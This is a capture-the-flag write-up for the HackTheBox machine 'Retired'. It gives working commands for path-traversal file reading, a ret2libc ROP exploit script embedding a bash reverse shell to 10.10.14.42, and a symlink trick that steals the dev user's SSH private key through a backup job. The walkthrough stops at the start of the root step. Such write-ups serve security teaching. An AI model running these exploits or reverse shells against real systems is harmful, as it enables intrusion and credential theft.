---
title: HackTheBox - Retired
date: 2022-08-16 11:00:00 +0800
categories: [HackTheBox, Medium]
tags: [buffer-overflow, reverse-engineering, local-file-disclosure, rop-chain, binfmt_misc]
media_subpath: /assets/img/machines/retired/
---

![Retired Machine Info](retired-machine-card.png)

## Info

Retired machine starts with a `Local File Disclosure` vulnerability in the web page, which we will use to download a binary used to validate a license file, this binary has a buffer overflow vulnerability which will allow us to gain access as www-data when uploading a modified license file. Later we will create a symbolic link to obtain the user's ssh key and be able to obtain a shell as the dev user. Finally we will abuse `binfmt_misc` to run a binary as root to get a shell. As a curiosity we will reverse engineer the license activation binary to see why it is vulnerable.

## Port Scan

> script scanning (`-sC`), version scanning (`-sV`), output all formats (`-oA`)
{: .prompt-info }

```bash
$ nmap -sC -sV -oA nmap/retired 10.129.227.96
Nmap scan report for 10.129.227.96
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }

We can see that you have two ports open, running `ssh` and `http`. We can also see that the http port is running using `nginx`.

## Recon

```bash
$ curl -i http://10.129.227.96/
HTTP/1.1 302 Found
Server: nginx
Date: Tue, 16 Aug 2022 09:40:22 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: /index.php?page=default.html
```
{: .nolineno }

When we make a request to the root of the web we can see that it makes a redirect with a url that seems somewhat suspicious.

```bash
$ curl http://10.129.227.96/index.php?page=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
[...]
```
{: .nolineno }

Great! We have `Local File Disclosure` vulnerability so we can read files from the system, let's launch `feroxbuster` to see what other paths the web has.

### Directory Brute Force

> file extensions to be searched (`-x`)
{: .prompt-info }

```bash
$ feroxbuster -u http://10.129.227.96 -x php,html                                            

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.96
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.129.227.96/ => /index.php?page=default.html
302      GET        0l        0w        0c http://10.129.227.96/index.php => /index.php?page=default.html
200      GET       72l      304w     4144c http://10.129.227.96/beta.html
200      GET      188l      824w    11414c http://10.129.227.96/default.html
[...]
```
{: .nolineno }

Another result apart from the ones we know has been listed, let's see what `beta.html` contains.

### Beta Testing Functionality

![Beta Page](beta-page.png)

It looks like a file upload page, let's create a blank file and view the request and response with burpsuite.

![Upload File Request](upload-file-request.png)

We can see that it makes a POST request to `activate_license.php`, since we have our `LFD` let's see what this code is doing.

```php
$ curl http://10.129.227.96/index.php?page=activate_license.php     
<?php
  if(isset($_FILES['licensefile'])) {
      $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
      $license_size = $_FILES['licensefile']['size'];

      $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
      if (!$socket) { echo "error socket_create()\n"; }

      if (!socket_connect($socket, '127.0.0.1', 1337)) {
          echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
      }

      socket_write($socket, pack("N", $license_size));
      socket_write($socket, $license);

      socket_shutdown($socket);
      socket_close($socket);
  }
?>
```
{: .nolineno }

Apparently what it is doing is connecting to some service that is running on `localhost` on port `1337` and sending it first the size of the file and then the contents of the file.

> PHP pack function with `N` param sends unsigned long (always 32 bit, big endian byte order)
[PHP Manual](https://www.php.net/manual/en/function.pack.php)
{: .prompt-info }

Considering that there is some downstream process running on the localhost that `activate_license.php` is calling, let's try to identify it, for that, let's list the content of `/proc/sched_debug`.

> A summary of the task running on each processor is also shown, with the task name and PID, along with scheduler specific statistics. 
[Debugging Interface and Scheduler Statistics](https://doc.opensuse.org/documentation/leap/archive/15.0/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html)
{: .prompt-info }

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/sched_debug
Sched Debug Version: v0.11, 5.10.0-11-amd64 #1
[...]
runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
[...]
 S activate_licens   411     20813.643987        10   120         0.000000         3.341139         0.000000 0 0 /
[...]
```
{: .nolineno }

One of the displayed tasks sounds familiar, considering that the page we were calling to upload the file is `activate_license.php`. The PID of the process is `411`, let's take a look.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/411/cmdline -o cmdline

$ cat cmdline
/usr/bin/activate_license1337
```
{: .nolineno }

Perfect! we see that `/usr/bin/activate_license` is running on port `1337`, let's download it and take a look at it.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../usr/bin/activate_license -o activate_license

$ file activate_license                                                                                  
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped

$ chmod +x activate_license

$ ./activate_license 1337
[+] starting server listening on port 1337
[+] listening ...
```
{: .nolineno }

### Debugging activate license binary

The file is a 64-bit binary that we can use to replicate the server's file upload operation. The most common vulnerability is usually a buffer overflow, so let's launch the program in `gdb` to see what it is doing. As we saw in the code of `activate_license.php`, it first sends the length of the file and then the content of the file.

```bash
$ gdb -q ./activate_license
gef➤  set follow-fork-mode child                                                              
gef➤  run 1337                           
Starting program: /home/kali/htb/retired/activate_license 1337
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fca000'
[Thread debugging using libthread_db enabled]                                                
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337                                                   
[+] listening ...
```
{: .nolineno }

```bash
$ printf "\x00\x00\x02\xbcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc 127.0.0.1 1337
```
{: .nolineno }

The payload consists of two parts, `\x00\x00\x02\xbc` which is 700 in hexadecimal and `"A" * 700`.
If we now look at the `gdb` tab we can see something like the following:

```bash
$rax   : 0x2d4             
$rbx   : 0x005555555557c0  →  <__libc_csu_init+0> push r15
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde58  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x007fffffffd6c0  →  0x007ffff7cced90  →  0x8b00000088bf8b48
$rip   : 0x005555555555c0  →  <activate_license+643> ret 
$r8    : 0x0               
$r9    : 0x007ffff7e080c0  →  0x0000000000000000
$r10   : 0x007ffff7e07fc0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00555555555220  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde58│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rsp
0x007fffffffde60│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde68│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde70│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde78│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde80│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde88│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde90│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555b9 <activate_license+636> call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641> nop    
   0x5555555555bf <activate_license+642> leave  
 → 0x5555555555c0 <activate_license+643> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "activate_licens", stopped 0x5555555555c0 in activate_license (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555555c0 → activate_license(sockfd=0x4)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
{: .nolineno }

We note that the program has crashed, and we have overwritten `rsp` with all `A`, which indicates that it is indeed vulnerable to buffer overflow.

The reason the `rip` was not overflowed (technically it was, as we saw in the above screenshot, but there's more to it), is because the AAAAAAAA (0x4141414141414141) is considered a non-canonical memory address, or, in other words, 0x4141414141414141 is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses. 
Instead, the highest memory addresses programs can use are 48-bit wide addresses and they are capped to 0x00007FFFFFFFFFFF. This is done to prevent the unnecessary complexity in memory address translations that would not provide much benefit to the OSes or applications as it's very unlikely they would ever need to use all of that 64-bil address space. 

To know exactly at what point we are going to overwrite `rip` we are going to create a pattern of `700` as before, so we resend it replacing the A's with our pattern.

```bash
gef➤  pattern create 700
[+] Generating a pattern of 700 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaa
```
{: .nolineno }

```bash
$rax   : 0x2d4             
$rbx   : 0x005555555557c0  →  <__libc_csu_init+0> push r15
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffde58  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
$rbp   : 0x636161616161616f ("oaaaaaac"?)
$rsi   : 0x0               
$rdi   : 0x007fffffffd6c0  →  0x007ffff7cced90  →  0x8b00000088bf8b48
$rip   : 0x005555555555c0  →  <activate_license+643> ret 
$r8    : 0x0               
$r9    : 0x007ffff7e080c0  →  0x0000000000000000
$r10   : 0x007ffff7e07fc0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00555555555220  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────0x007fffffffde58│+0x0000: "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"      ← $rsp
0x007fffffffde60│+0x0008: "qaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwa[...]"
0x007fffffffde68│+0x0010: "raaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxa[...]"
0x007fffffffde70│+0x0018: "saaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacya[...]"
0x007fffffffde78│+0x0020: "taaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaacza[...]"
0x007fffffffde80│+0x0028: "uaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadba[...]"
0x007fffffffde88│+0x0030: "vaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadca[...]"
0x007fffffffde90│+0x0038: "waaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaadda[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555555b9 <activate_license+636> call   0x5555555550b0 <printf@plt>
   0x5555555555be <activate_license+641> nop    
   0x5555555555bf <activate_license+642> leave  
 → 0x5555555555c0 <activate_license+643> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "activate_licens", stopped 0x5555555555c0 in activate_license (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────[#0] 0x5555555555c0 → activate_license(sockfd=0x4)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────x/xg $rsp
0x7fffffffde58: 0x6361616161616170
gef➤  pattern offset 0x6361616161616170
[+] Searching for '0x6361616161616170'
[+] Found at offset 520 (little-endian search) likely
```
{: .nolineno }

Ok, `520` is the amount of junk we need to overwrite the stack, so the next 8 bytes are the ones that are going to overwrite `rip`, knowing this we can start crafting our exploit.

We are going to make use of the `pwn` python library, so if you don't have it you must install it with:

## Shell as www-data

```bash
$ pip install pwn
```
{: .nolineno }

### Check binary security

Before creating an attack strategy, let's check the security of the binary with checksec.

```bash
$ checksec --file=activate_license
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   100 Symbols       No    0               3               activate_license
```
{: .nolineno }

We can see that NX is activated. NX stands for "non-executable." It's often enabled at the CPU level, so an operating system with NX enabled can mark certain areas of memory as non-executable. Often, buffer-overflow exploits put code on the stack and then try to execute it. However, making this writable area non-executable can prevent such attacks.

### Exploit planning

To bypass the active NX, we will execute an attack known as `ret2libc`.

> A ret2libc (return to libc, or return to the C library) attack is one in which the attacker does not require any shellcode to take control of a target, vulnerable process.
{: .prompt-info }

Before we continue we need a few things to be able to craft our exploit:
1. binary base address
2. libc base address
3. libc itself

In order to obtain the addresses we need, we will execute the following through the `LFI` we had active:

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../proc/411/maps -o maps

$ cat maps                                                                        
55fc9a3b1000-55fc9a3b2000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55fc9a3b2000-55fc9a3b3000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55fc9a3b3000-55fc9a3b4000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55fc9a3b4000-55fc9a3b5000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55fc9a3b5000-55fc9a3b6000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55fc9be50000-55fc9be71000 rw-p 00000000 00:00 0                          [heap]
[...]
7f32526b9000-7f32526c8000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32526c8000-7f3252762000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3252762000-7f32527fb000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fb000-7f32527fc000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fc000-7f32527fd000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f32527fd000-7f3252822000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3252822000-7f325296d000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f325296d000-7f32529b7000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529b7000-7f32529b8000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529b8000-7f32529bb000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f32529bb000-7f32529be000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
[...]
7fff22762000-7fff22783000 rw-p 00000000 00:00 0                          [stack]
7fff227ca000-7fff227ce000 r--p 00000000 00:00 0                          [vvar]
7fff227ce000-7fff227d0000 r-xp 00000000 00:00 0                          [vdso]
```
{: .nolineno }

`0x55fc9a3b1000` is the binary base address and `0x7f32527fd000` is the libc base address.

```bash
$ curl -s http://10.129.227.96/index.php?page=../../../../../usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
```
{: .nolineno }

One more thing before we start, since we have downloaded libc let's see the address of the system function to execute our payload later.
```bash
$ objdump -d libc-2.31.so | grep system
0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
   48e53:       74 0b                   je     48e60 <__libc_system@@GLIBC_PRIVATE+0x10>
000000000012d5e0 <svcerr_systemerr@@GLIBC_2.2.5>:
  12d637:       75 05                   jne    12d63e <svcerr_systemerr@@GLIBC_2.2.5+0x5e>
```
{: .nolineno }

Ok! so now we have everything we need to start crafting our exploit.

### Crafting our exploit

```python
from pwn import *

offset = 520

# libc
libc_base = 0x7f32527fd000
libc_system = 0x48e50

# binary
binary_base = 0x55fc9a3b1000
```
{: .nolineno }

Okay, before we start, let's define the attack strategy, which will be as follows:

1. fill stack with junk to gain control of the `rip` (instruction pointer)
2. find a section in memory where we can write
3. write our payload in to the writable memory
4. call the system function passing as parameter a pointer to the memory section in which we have written our payload

Step 1 is already complete, we know that we need `520 bytes` of junk and the next `8 bytes` are the ones that will overwrite `rip`.

To find a section that we can write to, let's look for the `.data` part inside the binary.

```bash
$ readelf -S activate_license | grep ".data"
  [16] .rodata           PROGBITS         0000000000002000  00002000
  [23] .data             PROGBITS         0000000000004000  00003000
```
{: .nolineno }

Great, now we know that the address we have to write to is `binary_base + 0x4000`.

To copy our payload to the memory section where we can write and then execute the system call, we are going to make use of some [ROP Gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming) that will help us in this task.

```bash
$ ropper -f libc-2.31.so --search "pop rdi; ret"
0x0000000000026796: pop rdi; ret;
0x0000000000084bfd: pop rdi; retf; adc eax, dword ptr [rax]; ror rax, 0x11; xor rax, qword ptr fs:[0x30]; jmp rax;

$ ropper -f libc-2.31.so --search "pop rdx; ret"
0x00000000000cb1cd: pop rdx; ret;

$ ropper -f libc-2.31.so --search "mov [rdi], rdx; ret"
0x000000000003ace5: mov qword ptr [rdi], rdx; ret;
```
{: .nolineno }

Now that we have everything we need we are going to generate the final exploit with all of the above.

```python
from pwn import *

offset = 520

# libc
libc_base = 0x7f32527fd000
libc_system = p64(libc_base + 0x48e50)

# binary
binary_base = 0x55fc9a3b1000
writable = binary_base + 0x4000

# gadgets
POP_RDI = p64(libc_base + 0x26796)
POP_RDX = p64(libc_base + 0xcb1cd)
MOV_RDI_RDX = p64(libc_base + 0x3ace5)

sh = b"bash -c 'bash -i >& /dev/tcp/10.10.14.42/4242 0>&1'"

rop = b"A" * offset
for i in range(0, len(sh), 8):
  rop += POP_RDI
  rop += p64(writable + i)
  rop += POP_RDX
  rop += sh[i:i+8].ljust(8, b"\x00")
  rop += MOV_RDI_RDX

rop += POP_RDI
rop += p64(writable)
rop += libc_system

with open('license.payload', 'wb') as f:
  f.write(rop)
```

It sounds complicated, but really what you are doing is very simple. We adjust all the gadgets that we have found taking into account what is the base of libc, as well as the section in memory in which we are going to write with respect to the base of the binary.

Lets start by defining our payload (`line 18`) and start the rop chain with the `520 bytes` of junk, we loop over our payload in fragments of `8 bytes`, for each iteration an address in memory is established in which it will be written, starting from the initial base (`line 23`), this address is stored in `rdi`, the following is to take the 8 bytes corresponding to the payload (and in case of needing it because it does not have 8 bytes long, add nullbytes to fill it), store these bytes in `rdx` (`line 25`). Subsequently, the content of `rdx` is moved to the memory address indicated by `rdi`. At the end of the for loop. What we have achieved is to write the whole string of our payload in memory.

For the final phase, all we need to do is push the address pointing at the start of our payload into `rdi` and call system, which uses `rdi` as the first parameter.

I have drawn a very basic representation of what is happening for better understanding (Note: 0x4016 is incorrect, the address should be 0x4010).

![Stack Flow](stack-flow.gif)

We save the final result in a file, and use the functionality of `beta.html` to upload our file.

## Shell as user

Ok, so now we have a shell as `www-data`, let's do some recon to see how we can scale to a normal user.

```bash
www-data@retired:~$ systemctl list-timers --all
NEXT                        LEFT         LAST                        PASSED    UNIT                         ACTIVATES
Tue 2022-08-16 18:59:00 UTC 54s left     Tue 2022-08-16 18:58:01 UTC 3s ago    website_backup.timer         website_backup.service
Tue 2022-08-16 19:09:00 UTC 10min left   Tue 2022-08-16 18:39:01 UTC 19min ago phpsessionclean.timer        phpsessionclean.service
Wed 2022-08-17 00:00:00 UTC 5h 1min left Tue 2022-08-16 09:29:07 UTC 9h ago    logrotate.timer              logrotate.service
Wed 2022-08-17 00:00:00 UTC 5h 1min left Tue 2022-08-16 09:29:07 UTC 9h ago    man-db.timer                 man-db.service
Wed 2022-08-17 04:08:04 UTC 9h left      Tue 2022-08-16 11:14:14 UTC 7h ago    apt-daily.timer              apt-daily.service
Wed 2022-08-17 06:20:26 UTC 11h left     Tue 2022-08-16 09:31:27 UTC 9h ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2022-08-17 09:44:06 UTC 14h left     Tue 2022-08-16 09:44:06 UTC 9h ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2022-08-21 03:10:49 UTC 4 days left  Tue 2022-08-16 09:29:47 UTC 9h ago    e2scrub_all.timer            e2scrub_all.service
Mon 2022-08-22 01:38:35 UTC 5 days left  Tue 2022-08-16 10:43:47 UTC 8h ago    fstrim.timer                 fstrim.service

9 timers listed.
```
{: .nolineno }

Looking at the list of timers there is one that especially catches my attention `website_backup.service`, let's see what this service is doing.

```bash
www-data@retired:~$ systemctl cat website_backup.service
# /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
```
{: .nolineno }

We can see that it is running `/usr/bin/webbackup`, let's see what it is and what it does.

### Analyze webbackup script

```bash
www-data@retired:~$ cat /usr/bin/webbackup
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```
{: .nolineno }

What this script does is to create a backup of the `/var/www/html` folder, we are going to create a symbolic link to the home folder of the dev user, which we can see that it exists by looking at the `/etc/passwd` file and see if we can list the home directory.

### Dump user ssh key

```bash
www-data@retired:~/html$ ls -la
total 48
drwxrwsrwx 5 www-data www-data  4096 Aug 16 19:06 .
drwxrwsrwx 4 www-data www-data  4096 Aug 16 19:07 ..
-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
lrwxrwxrwx 1 www-data www-data     9 Aug 16 19:06 home -> /home/dev
-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js

www-data@retired:~$ ls -la
[...]
-rw-r--r--  1 dev      www-data  529934 Aug 16 19:07 2022-08-16_19-07-01-html.zip

www-data@retired:/tmp$ unzip 2022-08-16_19-07-01-html
[...]
 creating: var/www/html/home/
extrcting: var/www/html/home/user.txt
inflating: var/www/html/home/.bashrc
 creating: var/www/html/home/.ssh/
inflating: var/www/html/home/.ssh/id_rsa.pub
inflating: var/www/html/home/.ssh/authorized_keys
inflating: var/www/html/home/.ssh/id_rsa
 creating: var/www/html/home/.local/
 creating: var/www/html/home/.local/share/
 creating: var/www/html/home/.local/share/nano/
 creating: var/www/html/home/emuemu/
 creating: var/www/html/home/emuemu/test/
inflating: var/www/html/home/emuemu/test/examplerom
inflating: var/www/html/home/emuemu/reg_helper
inflating: var/www/html/home/emuemu/reg_helper.c
inflating: var/www/html/home/emuemu/README.md
inflating: var/www/html/home/emuemu/emuemu
inflating: var/www/html/home/emuemu/emuemu.c
inflating: var/www/html/home/emuemu/Makefile
inflating: var/www/html/home/.profile
inflating: var/www/html/home/.bash_logout
 creating: var/www/html/home/activate_license/
inflating: var/www/html/home/activate_license/activate_license.c
inflating: var/www/html/home/activate_license/activate_license.service
inflating: var/www/html/home/activate_license/Makefile
inflating: var/www/html/home/activate_license/activate_license
[...]
```
{: .nolineno }

The backup has been created correctly, and when extracting it we can see the home directory of the user, now we already have the ssh key, so we download it and login into the machine as the user `dev`.

## Shell as root

Once we login with `ssh`, we see in the user's home a folder called `emuemu`, in the `README.md` there is a description of what it is.

> EMUEMU is the official software emulator for the handheld console OSTRICH. After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal. For example the ROM named `rom` can be run with `./rom`.
{: .prompt-info }

We see that it uses make, so let's take a look at the `Makefile` to see what it contains.

```bash
CC := gcc
CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion

SOURCES := $(wildcard *.c)
TARGETS := $(SOURCES:.c=)

.PHONY: install clean

install: $(TARGETS)
        @echo "[+] Installing program files"
        install --mode 0755 emuemu /usr/bin/
